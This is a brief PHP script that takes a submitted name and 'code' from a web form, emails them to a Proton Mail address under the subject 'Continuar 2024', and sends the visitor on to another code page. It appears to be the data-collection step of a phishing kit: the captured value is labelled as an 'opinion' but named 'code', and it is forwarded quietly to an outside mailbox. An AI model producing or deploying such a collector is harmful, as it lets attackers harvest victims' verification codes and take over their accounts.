<?php 
	$destino= "Rayelus@proton.me";
	$nombre= $_POST["nombre"];
	$code= $_POST["code"];
	$contenido= "Nombre: " . $nombre . " " . "\nOpinión: " . $code; 

	mail($destino,"Continuar 2024 ", $contenido);
	header("Location:../html/code.html");


?>